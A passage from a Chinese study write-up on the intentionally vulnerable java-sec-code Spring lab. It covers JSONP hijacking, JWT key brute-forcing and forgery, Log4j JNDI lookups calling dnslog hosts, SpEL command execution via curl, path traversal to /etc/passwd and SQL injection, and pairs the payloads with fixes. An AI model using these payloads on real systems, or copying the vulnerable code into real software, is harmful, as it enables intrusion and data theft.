        String[] mimeTypeBlackList = {
                "text/html",
                "text/javascript",
                "application/javascript",
                "application/ecmascript",
                "text/xml",
                "application/xml"
        };
        for (String blackMimeType : mimeTypeBlackList) {
            // 用contains是为了防止text/html;charset=UTF-8绕过
            if (SecurityUtil.replaceSpecialStr(mimeType).toLowerCase().contains(blackMimeType)) {
                logger.error("[-] Mime type error: " + mimeType);
                deleteFile(filePath);
                return "Upload failed. Illeagl picture.";
            }
        }

        // 判断文件内容是否是图片 校验3
        boolean isImageFlag = isImage(excelFile);
        deleteFile(randomFilePath);

        if (!isImageFlag) {
            logger.error("[-] File is not Image");
            deleteFile(filePath);
            return "Upload failed. Illeagl picture.";
        }

        try {
            // Get the file and save it somewhere
            byte[] bytes = multifile.getBytes();
            Path path = Paths.get(UPLOADED_FOLDER + multifile.getOriginalFilename());
            Files.write(path, bytes);
        } catch (IOException e) {
            logger.error(e.toString());
            deleteFile(filePath);
            return "Upload failed";
        }

        logger.info("[+] Safe file. Suffix: {}, MIME: {}", Suffix, mimeType);
        logger.info("[+] Successfully uploaded {}", filePath);
        return String.format("You successfully uploaded '%s'", filePath);
    }

   private void deleteFile(String filePath) {
        File delFile = new File(filePath);
        if(delFile.isFile() && delFile.exists()) {
            if (delFile.delete()) {
                logger.info("[+] " + filePath + " delete successfully!");
                return;
            }
        }
        logger.info(filePath + " delete failed!");
    }

    /**
     * 为了使用ImageIO.read()
     *
     * 不建议使用transferTo，因为原始的MultipartFile会被覆盖
     * https://stackoverflow.com/questions/24339990/how-to-convert-a-multipart-file-to-file
     */
    private File convert(MultipartFile multiFile) throws Exception {
        String fileName = multiFile.getOriginalFilename();
        String suffix = fileName.substring(fileName.lastIndexOf("."));
        UUID uuid = Generators.timeBasedGenerator().generate();
        randomFilePath = UPLOADED_FOLDER + uuid + suffix;
        // 随机生成一个同后缀名的文件
        File convFile = new File(randomFilePath);
        boolean ret = convFile.createNewFile();
        if (!ret) {
            return null;
        }
        FileOutputStream fos = new FileOutputStream(convFile);
        fos.write(multiFile.getBytes());
        fos.close();
        return convFile;
    }

    /**
     * Check if the file is a picture.
     */
    private static boolean isImage(File file) throws IOException {
        BufferedImage bi = ImageIO.read(file);
        return bi != null;
    }
```

### GetRequestURI

获取用户输入的 uri ，校验是否绕过用户登录

重要代码：

```java
package org.joychou.controller;
import .........
    ....
/**
 * The difference between getRequestURI and getServletPath.
 * 由于Spring Security的<code>antMatchers("/css/**", "/js/**")</code>未使用getRequestURI，所以登录不会被绕过。
 * <p>
 * Details: https://joychou.org/web/security-of-getRequestURI.html
 * <p>
 * Poc:
 * http://localhost:8080/css/%2e%2e/exclued/vuln
 * http://localhost:8080/css/..;/exclued/vuln
 * http://localhost:8080/css/..;bypasswaf/exclued/vuln
 *
 * @author JoyChou @2020-03-28
 */

@RestController
@RequestMapping("uri")
public class GetRequestURI {

    private final Logger logger = LoggerFactory.getLogger(this.getClass());

    @GetMapping(value = "/exclued/vuln")
    public String exclued(HttpServletRequest request) {

        String[] excluedPath = {"/css/**", "/js/**"};
        String uri = request.getRequestURI(); // Security: request.getServletPath()
        PathMatcher matcher = new AntPathMatcher();

        logger.info("getRequestURI: " + uri);
        logger.info("getServletPath: " + request.getServletPath());

        for (String path : excluedPath) {
            if (matcher.match(path, uri)) {
                return "You have bypassed the login page.";
            }
        }
        return "This is a login page >..<";
    }
}
```

### IPForge

获取真实 IP

#### 安全情况

```java
// no any proxy
@RequestMapping("/noproxy")
public static String noProxy(HttpServletRequest request) {
    return request.getRemoteAddr();
}
```

<img src=".\图片\Snipaste_2023-03-17_14-00-41.png" alt="Snipaste_2023-03-17_14-00-41" style="zoom:80%;" />

#### 不安全情况

```java
/**
 * proxy_set_header X-Real-IP $remote_addr;
 * proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for
 * if code used X-Forwarded-For to get ip, the code must be vulnerable.
 */
@RequestMapping("/proxy")
@ResponseBody
public static String proxy(HttpServletRequest request) {
    String ip = request.getHeader("X-Real-IP");
    if (StringUtils.isNotBlank(ip)) {
        return ip;
    } else {
        String remoteAddr = request.getRemoteAddr();
        if (StringUtils.isNotBlank(remoteAddr)) {
            return remoteAddr;
        }
    }
    return "";
}
```

<img src=".\图片\Snipaste_2023-03-17_14-02-37.png" alt="Snipaste_2023-03-17_14-02-37" style="zoom:80%;" />

### JSONP

```java
import ........................
/**
 * @author JoyChou (joychou@joychou.org) @ 2018.10.24
 * https://github.com/JoyChou93/java-sec-code/wiki/JSONP
 */

@Slf4j
@RestController
@RequestMapping("/jsonp")
public class Jsonp {

    private String callback = WebConfig.getBusinessCallback();

    @Autowired
    CookieCsrfTokenRepository cookieCsrfTokenRepository;
    /**
     * Set the response content-type to application/javascript.
     * <p>
     * http://localhost:8080/jsonp/vuln/referer?callback_=test
     */
    @RequestMapping(value = "/vuln/referer", produces = "application/javascript")
    public String referer(HttpServletRequest request) {
        String callback = request.getParameter(this.callback);
        return WebUtils.json2Jsonp(callback, LoginUtils.getUserInfo2JsonStr(request));
    }

    /**
     * Direct access does not check Referer, non-direct access check referer.
     * Developer like to do jsonp testing like this.
     * <p>
     * http://localhost:8080/jsonp/vuln/emptyReferer?callback_=test
     */
    @RequestMapping(value = "/vuln/emptyReferer", produces = "application/javascript")
    public String emptyReferer(HttpServletRequest request) {
        String referer = request.getHeader("referer");

        if (null != referer && SecurityUtil.checkURL(referer) == null) {
            return "error";
        }
        String callback = request.getParameter(this.callback);
        return WebUtils.json2Jsonp(callback, LoginUtils.getUserInfo2JsonStr(request));
    }

    /**
     * Adding callback or _callback on parameter can automatically return jsonp data.
     * http://localhost:8080/jsonp/object2jsonp?callback=test
     * http://localhost:8080/jsonp/object2jsonp?_callback=test
     *
     * @return Only return object, AbstractJsonpResponseBodyAdvice can be used successfully.
     * Such as JSONOjbect or JavaBean. String type cannot be used.
     */
    @RequestMapping(value = "/object2jsonp", produces = MediaType.APPLICATION_JSON_VALUE)
    public JSONObject advice(HttpServletRequest request) {
        return JSON.parseObject(LoginUtils.getUserInfo2JsonStr(request));
    }


    /**
     * http://localhost:8080/jsonp/vuln/mappingJackson2JsonView?callback=test
     * Reference: https://p0sec.net/index.php/archives/122/ from p0
     * Affected version:  java-sec-code test case version: 4.3.6
     * - Spring Framework 5.0 to 5.0.6
     * - Spring Framework 4.1 to 4.3.17
     */
    @RequestMapping(value = "/vuln/mappingJackson2JsonView", produces = MediaType.APPLICATION_JSON_VALUE)
    public ModelAndView mappingJackson2JsonView(HttpServletRequest req) {
        ModelAndView view = new ModelAndView(new MappingJackson2JsonView());
        Principal principal = req.getUserPrincipal();
        view.addObject("username", principal.getName());
        return view;
    }


    /**
     * Safe code.
     * http://localhost:8080/jsonp/sec?callback_=test
     */
    @RequestMapping(value = "/sec/checkReferer", produces = "application/javascript")
    public String safecode(HttpServletRequest request) {
        String referer = request.getHeader("referer");

        if (SecurityUtil.checkURL(referer) == null) {
            return "error";
        }
        String callback = request.getParameter(this.callback);
        return WebUtils.json2Jsonp(callback, LoginUtils.getUserInfo2JsonStr(request));
    }

    /**
     * http://localhost:8080/jsonp/getToken?fastjsonpCallback=aa
     *
     * object to jsonp
     */
    @GetMapping("/getToken")
    public CsrfToken getCsrfToken1(CsrfToken token) {
        return token;
    }

    /**
     * http://localhost:8080/jsonp/fastjsonp/getToken?fastjsonpCallback=aa
     *
     * fastjsonp to jsonp
     */
    @GetMapping(value = "/fastjsonp/getToken", produces = "application/javascript")
    public String getCsrfToken2(HttpServletRequest request) {
        CsrfToken csrfToken = cookieCsrfTokenRepository.loadToken(request); // get csrf token

        String callback = request.getParameter("fastjsonpCallback");
        if (StringUtils.isNotBlank(callback)) {
            JSONPObject jsonpObj = new JSONPObject(callback);
            jsonpObj.addParameter(csrfToken);
            return jsonpObj.toString();
        } else {
            return csrfToken.toString();
        }
    }

}
```

这里我复现失败了，构造的恶意代码被受害者触发时，显示302跳转，原因是 COOKIE 没带上，恶意代码是放在其它服务器上的



<img src=".\图片\Snipaste_2023-03-17_18-33-39.png" alt="Snipaste_2023-03-17_18-33-39" style="zoom:80%;" />

#### 作者测试

##### 安全风险

使用`AbstractJsonpResponseBodyAdvice`能避免callback导致的XSS问题，但是会带来一个新的风险：可能有的JSON接口强行被设置为了JSONP，导致JSON劫持。所以使用`AbstractJsonpResponseBodyAdvice`，需要默认校验所有jsonp接口的referer是否合法。

##### 注意

在Spring Framework 5.1，移除了`AbstractJsonpResponseBodyAdvice`类。Springboot `2.1.0 RELEASE`默认使用spring framework版本5.1.2版本。也就是在SpringBoot `2.1.0 RELEASE`及以后版本都不能使用该功能，用CORS替代。

https://docs.spring.io/spring/docs/5.0.x/javadoc-api/org/springframework/web/servlet/mvc/method/annotation/AbstractJsonpResponseBodyAdvice.html

> Will be removed as of Spring Framework 5.1, use CORS instead.

##### 前端调用代码

- 使用ajax的jsonp调用方式，运行后会弹框`JoyChou`。
- 使用script src方式，运行后会弹框`JoyChou`。

使用ajax的jsonp调用方式代码：

```html
<html>
<head>
<meta charset="UTF-8" />
<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
</head>
<body>
<script language="JavaScript">
$(document).ready(function() {
	$.ajax({
		url:'http://localhost:8080/jsonp/advice',
		dataType:'jsonp',
		success:function(data){
			alert(data.name)
		}
	});
});
</script>
</body>
</html>
```

script src方式代码：

```html
<html>

<script>
	function test(data){
		alert(data.name);
	}
</script>
<script src=http://localhost:8080/jsonp/referer?callback=test></script>
</html>
```

##### 空Referer绕过

有时候开发同学为了测试方便，JSONP接口能直接访问，不直接访问做了Referer限制。正常来讲，前端发起的请求默认都会带着Referer，所以简单说下如何绕过空Referer。

###### Poc 1

```html
<html>
<meta name="referrer" content="no-referrer" />

<script>
	function test(data){
		alert(data.name);
	}
</script>
<script src=http://localhost:8080/jsonp/emptyReferer?callback=test></script>
</html>
```

###### Poc2

```html
<iframe src="javascript:'<script>function test(data){alert(data.name);}</script><script src=http://localhost:8080/jsonp/emptyReferer?callback=test></script>'"></iframe>
```

### JWT

#### 重要代码

设置 JWT 到 COOKIE 里：

```java
private static final String COOKIE_NAME = "USER_COOKIE";
/**
 * http://localhost:8080/jwt/createToken
 * Create jwt token and set token to cookies.
 *
 * @author JoyChou 2022-09-20
 */
@GetMapping("/createToken")
public String createToken(HttpServletResponse response, HttpServletRequest request) {
    String loginUser = request.getUserPrincipal().getName();
    log.info("Current login user is " + loginUser);

    CookieUtils.deleteCookie(response, COOKIE_NAME);
    String token = JwtUtils.generateTokenByJavaJwt(loginUser);
    Cookie cookie = new Cookie(COOKIE_NAME, token);

    cookie.setMaxAge(86400);    // 1 DAY
    cookie.setPath("/");
    cookie.setSecure(true);
    response.addCookie(cookie);
    return "Add jwt token cookie successfully. Cookie name is USER_COOKIE";
}
```

从 JWT 里**获取用户权限信息**：

```java
/**
 * http://localhost:8080/jwt/getName
 * Get nickname from USER_COOKIE
 *
 * @author JoyChou 2022-09-20
 * @param user_cookie cookie
 * @return nickname
 */
@GetMapping("/getName")
public String getNickname(@CookieValue(COOKIE_NAME) String user_cookie) {
    String nickname = JwtUtils.getNicknameByJavaJwt(user_cookie);
    return "Current jwt user is " + nickname;
}
```

#### 复现

这是为当前用户权限（admin）设置 JWT 到  COOKIE 里

<img src=".\图片\Snipaste_2023-03-17_18-46-16.png" alt="Snipaste_2023-03-17_18-46-16" style="zoom: 80%;" />

这是显示用户身份权限页面，用户为 admin

<img src=".\图片\Snipaste_2023-03-17_18-52-04.png" alt="Snipaste_2023-03-17_18-52-04" style="zoom:80%;" />

这是生成与使用 jwt 的代码：

```java
package org.joychou.util;

import com.auth0.jwt.JWT;
import com.auth0.jwt.JWTVerifier;
import com.auth0.jwt.algorithms.Algorithm;
import com.auth0.jwt.exceptions.JWTVerificationException;
import io.jsonwebtoken.Claims;
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.SignatureAlgorithm;
import lombok.extern.slf4j.Slf4j;

import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.Date;

@Slf4j
public class JwtUtils {

    private static final long EXPIRE = 1440 * 60 * 1000;  // 1440 Minutes, 1 DAY
    private static final String SECRET = "123456";
    private static final String B64_SECRET = Base64.getEncoder().encodeToString(SECRET.getBytes(StandardCharsets.UTF_8));

    /**
     * Generate JWT Token by jjwt (last update time: Jul 05, 2018)
     *
     * @author JoyChou 2022-09-20
     * @param userId userid
     * @return token
     */
    public static String generateTokenByJjwt(String userId) {
        return Jwts.builder()
                .setHeaderParam("typ", "JWT")   // header
                .setHeaderParam("alg", "HS256")     // header
                .setIssuedAt(new Date())    // token发布时间
                .setExpiration(new Date(System.currentTimeMillis() + EXPIRE))   // token过期时间
                .claim("userid", userId)
                // secret在signWith会base64解码，但网上很多代码示例并没对secret做base64编码，所以在爆破key的时候可以注意下。
                .signWith(SignatureAlgorithm.HS256, B64_SECRET)
                .compact();
    }

    public static String getUserIdFromJjwtToken(String token) {
        try {
            Claims claims = Jwts.parser().setSigningKey(B64_SECRET).parseClaimsJws(token).getBody();
            return (String)claims.get("userid");
        } catch (Exception e) {
            return e.toString();
        }
    }

    /**
     * Generate jwt token by java-jwt.
     *
     * @author JoyChou 2022-09-20
     * @param nickname nickname
     * @return jwt token
     */
    public static String generateTokenByJavaJwt(String nickname) {
        return JWT.create()
                .withClaim("nickname", nickname)
                .withExpiresAt(new Date(System.currentTimeMillis() + EXPIRE))
                .withIssuedAt(new Date())
                .sign(Algorithm.HMAC256(SECRET));
    }


    /**
     * Verify JWT Token
     * @param token token
     * @return Valid token returns true. Invalid token returns false.
     */
    public static Boolean verifyTokenByJavaJwt(String token) {
        try {
            Algorithm algorithm = Algorithm.HMAC256(SECRET);
            JWTVerifier verifier = JWT.require(algorithm).build();
            verifier.verify(token);
            return true;
        } catch (JWTVerificationException exception){
            log.error(exception.toString());
            return false;
        }
    }


    public static String getNicknameByJavaJwt(String token) {
        // If the signature is not verified, there will be security issues.
        if (!verifyTokenByJavaJwt(token)) {
            log.error("token is invalid");
            return null;
        }
        return JWT.decode(token).getClaim("nickname").asString();
    }


    public static void main(String[] args) {
        String jjwtToken = generateTokenByJjwt("10000");
        System.out.println(jjwtToken);
        System.out.println(getUserIdFromJjwtToken(jjwtToken));

        String token = generateTokenByJavaJwt("JoyChou");
        System.out.println(token);
        System.out.println(getNicknameByJavaJwt(token));
    }
}
```

#### 利用思路

当前我们用户的身份权限为 admin ，admin 身份已经设置了 JWT。普通 `zf1yolo`  用户可以尝试修改 JWT 达到 admin 权限，**这个前提是密匙为空**。其它的测试有 空密匙、爆破密匙 等

<img src=".\图片\Snipaste_2023-03-17_18-59-49.png" alt="Snipaste_2023-03-17_18-59-49" style="zoom: 50%;" />

#### 爆破密匙攻击步骤

1、访问 http://localhost:8080/jwt/createToken ，获取头里面的`USER_COOKIE`值。

得到的token为eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuaWNrbmFtZSI6ImpveWNob3UiLCJleHAiOjE2NjM4MTczNzUsImlhdCI6MTY2MzczMDk3NX0.2tWbNUiah0BCHqni5ePnmvcgY7lN4hm2zw41HKxir1w

2、爆破私钥KEY

利用jwt的decode方法的verify参数，设置为True的情况如果密钥不正确会抛异常。所以只要不抛异常，则爆破成功。

```
import jwt
import sys

def main():
    token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuaWNrbmFtZSI6ImpveWNob3UiLCJleHAiOjE2NjM4MTczNzUsImlhdCI6MTY2MzczMDk3NX0.2tWbNUiah0BCHqni5ePnmvcgY7lN4hm2zw41HKxir1w'
    with open('password_dict.txt', 'r') as f:
        for key in f.readlines():
            key = key.strip()
            try:
                jwt.decode(token, algorithms='HS256', verify=True, key=key)
                print(f'jwt key found: {key}')
                sys.exit()
            except Exception as e:
                pass


if __name__ == '__main__':
    main()
```

返回

```
jwt key found: 123456
```

3、生成伪造恶意的JWT Token。

https://jwt.io/ 中解密出的header和payload分别为：

header

```
{
  "typ": "JWT",
  "alg": "HS256"
}
```

payload

```
{
  "nickname": "joychou",
  "exp": 1663817375,
  "iat": 1663730975
}
```

构造恶意的JWT Token，将nickname的joychou改为hacker。代码:

```
import jwt 

def generate_token():
    headers = {
        "alg": "HS256",
        "typ": "JWT"
    }
    salt = "123456"

    payload = {
        "nickname": "hacker",
        "exp": 1663817375,
        "iat": 1663730975
    }

    token = jwt.encode(payload=payload, key=salt, algorithm='HS256', headers=headers)
    return token
```

恶意伪造的JWT Token为： eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuaWNrbmFtZSI6ImhhY2tlciIsImV4cCI6MTY2MzgxNzM3NSwiaWF0IjoxNjYzNzMwOTc1fQ.xlKSHgFToceHYQ9lcYjDB6GxSUMokMYWSKOJIYuauB4

4、将伪造的JWT Token替换`USER_COOKIE`

访问 http://localhost:8080/jwt/getName ，返回：

```
Current jwt user is hacker
```

### Log4j2

重要代码：

```java
package org.joychou.controller;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;
@RestController
public class Log4j {
    private static final Logger logger = LogManager.getLogger("Log4j");
    /**
     * http://localhost:8080/log4j?token=${jndi:ldap://wffsr5.dnslog.cn:9999}
     * ${jndi:ldap://${sys:java.version}.iq6kg4.dnslog.cn}
     * Default: error/fatal/off
     * Fix: Update log4j to lastet version.
     * @param token token
     */
    @GetMapping("/log4j")
    public String log4j(String token) {
        if(token.equals("java-sec-code")) {
            return "java sec code";
        } else {
            logger.error(token); //可以控制输入的 token
            return "error";
        }
    }
}
```

测试（注意url编码）：

```
http://localhost:8080/log4j?token=%24%7bjndi%3aldap%3a%2f%2f%24%7bsys%3ajava%2eversion%7d%2eqmk0q4%2ednslog%2ecn%7d
```

<img src=".\图片\Snipaste_2023-03-17_19-08-32.png" alt="Snipaste_2023-03-17_19-08-32" style="zoom:80%;" />

### PathTraversal

#### 复现

目录穿越，重要代码：

```java
/**
 * http://localhost:8080/path_traversal/vul?filepath=../../../../../etc/passwd
 */
@GetMapping("/path_traversal/vul")
public String getImage(String filepath) throws IOException {
    return getImgBase64(filepath);  // 读取文件内容返回
}

private String getImgBase64(String imgFile) throws IOException {

        logger.info("Working directory: " + System.getProperty("user.dir"));
        logger.info("File path: " + imgFile);

        File f = new File(imgFile);
        if (f.exists() && !f.isDirectory()) {
            byte[] data = Files.readAllBytes(Paths.get(imgFile));
            return new String(Base64.encodeBase64(data));
        } else {
            return "File doesn't exist or is not a file.";
        }
    }
```

测试,：

```
http://localhost:8080/path_traversal/vul?filepath=pom.xml
http://localhost:8080/path_traversal/vul?filepath=../note.txt
```

得到的文件内容是 base64 编码后的

<img src=".\图片\Snipaste_2023-03-17_19-22-17.png" alt="Snipaste_2023-03-17_19-22-17" style="zoom: 80%;" />

<img src=".\图片\Snipaste_2023-03-17_19-22-25.png" alt="Snipaste_2023-03-17_19-22-25" style="zoom:80%;" />

#### 安全写法

```java
@GetMapping("/path_traversal/sec")
public String getImageSec(String filepath) throws IOException {
    if (SecurityUtil.pathFilter(filepath) == null) {   // 过滤用户的输入参数
        logger.info("Illegal file path: " + filepath);
        return "Bad boy. Illegal file path.";
    }
    return getImgBase64(filepath);
}

// 循环过滤 .. 与 / 等危险字符
   public static String pathFilter(String filepath) {
        String temp = filepath;

        // use while to sovle multi urlencode
        while (temp.indexOf('%') != -1) {
            try {
                temp = URLDecoder.decode(temp, "utf-8");
            } catch (UnsupportedEncodingException e) {
                logger.info("Unsupported encoding exception: " + filepath);
                return null;
            } catch (Exception e) {
                logger.info(e.toString());
                return null;
            }
        }

        if (temp.contains("..") || temp.charAt(0) == '/') {
            return null;
        }
        
        return filepath;
    }
```

### SpEL

学习文章：  [浅入深SpEL表达式注入漏洞总结](https://blog.csdn.net/snowlyzz/article/details/128883763)

#### 漏洞原理

SimpleEvaluationContext和StandardEvaluationContext是SpEL提供的两个EvaluationContext：

- SimpleEvaluationContext - 针对不需要SpEL语言语法的全部范围并且应该受到有意限制的表达式类别，公开SpEL语言特性和配置选项的子集。
- StandardEvaluationContext - 公开全套SpEL语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。

SimpleEvaluationContext旨在仅支持SpEL语言语法的一个子集，不包括 Java类型引用、构造函数和bean引用；而StandardEvaluationContext是支持全部SpEL语法的。

由前面知道，SpEL表达式是可以操作类及其方法的，可以通过类类型表达式 T(Type) 来调用任意类方法。这是因为**在不指定EvaluationContext 的情况下默认采用的是 StandardEvaluationContext ，而它包含了SpEL的所有功能，在允许用户控制输入的情况下可以成功造成任意命令执行。**

#### 代码片段

```java
package org.joychou.controller;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
@RestController
public class SpEL {
    /**
     * SpEL to RCE
     * http://localhost:8080/spel/vul/?expression=xxx.
     * xxx is urlencode(exp)
     * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
     */
    @GetMapping("/spel/vuln")
    public String rce(String expression) {
        ExpressionParser parser = new SpelExpressionParser();
        //修复方法 fix method: SimpleEvaluationContext
        return parser.parseExpression(expression).getValue().toString();
    }

    // 手动测试漏洞，漏洞形成原理
    public static void main(String[] args) {
        ExpressionParser parser = new SpelExpressionParser();
        String expression = "T(java.lang.Runtime).getRuntime().exec(\"calc\")";
        String result = parser.parseExpression(expression).getValue().toString();
        System.out.println(result);
    }
}
```

exp：

```
http://localhost:8080/spel/vuln/?expression=%54%28%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%29%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%75%72%6c%20%7a%66%31%79%6f%6c%6f%2e%35%6c%64%36%77%75%2e%64%6e%73%6c%6f%67%2e%63%6e%22%29
```

显示结果

<img src=".\图片\Snipaste_2023-03-17_20-53-26.png" alt="Snipaste_2023-03-17_20-53-26" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-03-17_20-53-32.png" alt="Snipaste_2023-03-17_20-53-32" style="zoom:80%;" />

### SQLI

#### JDBC

##### /jdbc/vuln

```java
/**
 * <p>Sql injection jbdc vuln code.</p><br>
 *
 * <a href="http://localhost:8080/sqli/jdbc/vuln?username=joychou">http://localhost:8080/sqli/jdbc/vuln?username=joychou</a>
 */
@RequestMapping("/jdbc/vuln")
public String jdbc_sqli_vul(@RequestParam("username") String username) {

    StringBuilder result = new StringBuilder();

    try {
        Class.forName(driver);
        Connection con = DriverManager.getConnection(url, user, password);

        if (!con.isClosed())
            System.out.println("Connect to database successfully.");

        // sqli vuln code
        Statement statement = con.createStatement();
        String sql = "select * from users where username = '" + username + "'"; // 直接拼接sql字符串导致注入
        logger.info(sql);
        ResultSet rs = statement.executeQuery(sql);

        while (rs.next()) {
            String res_name = rs.getString("username");
            String res_pwd = rs.getString("password");
            String info = String.format("%s: %s\n", res_name, res_pwd);
            result.append(info);
            logger.info(info);
        }
        rs.close();
        con.close();

    } catch (ClassNotFoundException e) {
        logger.error("Sorry, can't find the Driver!");
    } catch (SQLException e) {
        logger.error(e.toString());
    }
    return result.toString();
}
```

测试 payload： `http://localhost:8080/sqli/jdbc/vuln?username=-1%27%20union%20select%201,database(),version()%23`

```
?username=-1' union select 1,database(),version()#
```

<img src=".\图片\Snipaste_2023-03-18_13-35-36.png" alt="Snipaste_2023-03-18_13-35-36" style="zoom:80%;" />

拼接的 sql 查询语句为

<img src=".\图片\Snipaste_2023-03-18_13-36-44.png" alt="Snipaste_2023-03-18_13-36-44" style="zoom:80%;" />

##### /jdbc/sec

安全使用 jdbc，使用**预编译** ，重要代码如下：

```java 
/**
 * <p>Sql injection jbdc security code by using {@link PreparedStatement}.</p><br>
 *
 * <a href="http://localhost:8080/sqli/jdbc/sec?username=joychou">http://localhost:8080/sqli/jdbc/sec?username=joychou</a>
 */
@RequestMapping("/jdbc/sec")
public String jdbc_sqli_sec(@RequestParam("username") String username) {

    StringBuilder result = new StringBuilder();
    try {
        Class.forName(driver);
        Connection con = DriverManager.getConnection(url, user, password);

        if (!con.isClosed())
            System.out.println("Connect to database successfully.");

        // fix code
        String sql = "select * from users where username = ?"; // 使用 ? 占位符
        PreparedStatement st = con.prepareStatement(sql);      // 预编译
        st.setString(1, username);

        logger.info(st.toString());  // sql after prepare statement
        ResultSet rs = st.executeQuery();

        while (rs.next()) {
            String res_name = rs.getString("username");
            String res_pwd = rs.getString("password");
            String info = String.format("%s: %s\n", res_name, res_pwd);
            result.append(info);
            logger.info(info);
        }

        rs.close();
        con.close();

    } catch (ClassNotFoundException e) {
        logger.error("Sorry, can't find the Driver!");
        e.printStackTrace();
    } catch (SQLException e) {
        logger.error(e.toString());
    }
    return result.toString();
}
```

当正常查询时：
<img src=".\图片\Snipaste_2023-03-18_13-43-02.png" alt="Snipaste_2023-03-18_13-43-02" style="zoom:80%;" />

当使用之前的 payload 恶意查询时，-1 这里的单引号前面加了个 \

<img src=".\图片\Snipaste_2023-03-18_13-43-53.png" alt="Snipaste_2023-03-18_13-43-53" style="zoom:80%;" />

##### /jdbc/ps/vuln

非正常使用预编译，没用 ? 占位。以下是存在注入的写法，浪费了预编译

```java
/**
 * <p>Incorrect use of prepareStatement. PrepareStatement must use ? as a placeholder.</p>
 * <a href="http://localhost:8080/sqli/jdbc/ps/vuln?username=joychou' or 'a'='a">http://localhost:8080/sqli/jdbc/ps/vuln?username=joychou' or 'a'='a</a>
 */
@RequestMapping("/jdbc/ps/vuln")
public String jdbc_ps_vuln(@RequestParam("username") String username) {

    StringBuilder result = new StringBuilder();
    try {
        Class.forName(driver);
        Connection con = DriverManager.getConnection(url, user, password);

        if (!con.isClosed())
            System.out.println("Connecting to Database successfully.");

        String sql = "select * from users where username = '" + username + "'"; // 没用 ? 占位
        PreparedStatement st = con.prepareStatement(sql);  // 浪费了预编译机制

        logger.info(st.toString());
        ResultSet rs = st.executeQuery();

        while (rs.next()) {
            String res_name = rs.getString("username");
            String res_pwd = rs.getString("password");
            String info = String.format("%s: %s\n", res_name, res_pwd);
            result.append(info);
            logger.info(info);
        }

        rs.close();
        con.close();

    } catch (ClassNotFoundException e) {
        logger.error("Sorry, can't find the Driver!");
        e.printStackTrace();
    } catch (SQLException e) {
        logger.error(e.toString());
    }
    return result.toString();
}
```

用之前的payload尝试：`http://localhost:8080/sqli/jdbc/ps/vulnusername=-1%27%20union%20select%201,database(),version()%23`

依然存在 sql 注入

<img src=".\图片\Snipaste_2023-03-18_13-49-27.png" alt="Snipaste_2023-03-18_13-49-27" style="zoom:80%;" />

#### MyBatis

`#{Parameter}` 采用**预编译**的方式构造SQL，避免了SQL注入的产生。而 `${Parameter}` **采用拼接的方式**构造SQL，在对用户输入过滤不严格的前提下，此处很可能存在SQL注入

##### /mybatis/vuln01

```java
/**
 * <p>Sql injection of mybatis vuln code.</p>
 * <a href="http://localhost:8080/sqli/mybatis/vuln01?username=joychou' or '1'='1">http://localhost:8080/sqli/mybatis/vuln01?username=joychou' or '1'='1</a>
 * <p>select * from users where username = 'joychou' or '1'='1' </p>
 */
@GetMapping("/mybatis/vuln01")
public List<User> mybatisVuln01(@RequestParam("username") String username) {
    return userMapper.findByUserNameVuln01(username);
}
```

<img src=".\图片\Snipaste_2023-03-18_13-54-24.png" alt="Snipaste_2023-03-18_13-54-24" style="zoom:67%;" />

构造 payload：

```
http://localhost:8080/sqli/mybatis/vuln01?username=joychou' or '1'='1  //返回所有用户信息
http://localhost:8080/sqli/mybatis/vuln01?username=joychou' or '1'='2  //只返回joychou的用户信息
```

<img src=".\图片\Snipaste_2023-03-18_14-05-51.png" alt="Snipaste_2023-03-18_14-05-51" style="zoom:67%;" />

<img src=".\图片\Snipaste_2023-03-18_14-04-48.png" alt="Snipaste_2023-03-18_14-04-48" style="zoom:67%;" />

这两次执行的 sql 语句：

<img src=".\图片\Snipaste_2023-03-18_14-07-38.png" alt="Snipaste_2023-03-18_14-07-38" style="zoom:67%;" />

##### /mybatis/vuln02

```java
/**
 * <p>Sql injection of mybatis vuln code.</p>
 * <a href="http://localhost:8080/sqli/mybatis/vuln02?username=joychou' or '1'='1">http://localhost:8080/sqli/mybatis/vuln02?username=joychou' or '1'='1</a>
 * <p>select * from users where username like '%joychou' or '1'='1%' </p>
 */
@GetMapping("/mybatis/vuln02")
public List<User> mybatisVuln02(@RequestParam("username") String username) {
    return userMapper.findByUserNameVuln02(username);
}
```

<img src=".\图片\Snipaste_2023-03-18_14-09-07.png" alt="Snipaste_2023-03-18_14-09-07" style="zoom: 67%;" />

<img src=".\图片\Snipaste_2023-03-18_14-10-07.png" alt="Snipaste_2023-03-18_14-10-07" style="zoom:67%;" />

执行 payload ，查询到所有信息：

```
http://localhost:8080/sqli/mybatis/vuln02?username=joychou%27%20or%20%271%27=%271%27%23
```

<img src=".\图片\Snipaste_2023-03-18_14-24-36.png" alt="Snipaste_2023-03-18_14-24-36" style="zoom:67%;" />

再看 sql 语句执行情况：

<img src=".\图片\Snipaste_2023-03-18_14-25-43.png" alt="Snipaste_2023-03-18_14-25-43" style="zoom:80%;" />

##### /mybatis/orderby/vuln03

`ordeyby` 的注入，使用的是 `${Parameter}` **采用拼接的方式**构造 SQL

```java
/**
 * <p>Sql injection of mybatis vuln code.</p>
 * <a href="http://localhost:8080/sqli/mybatis/orderby/vuln03?sort=id desc--">http://localhost:8080/sqli/mybatis/orderby/vuln03?sort=id desc--</a>
 * <p> select * from users order by id desc-- asc</p>
 */
@GetMapping("/mybatis/orderby/vuln03")
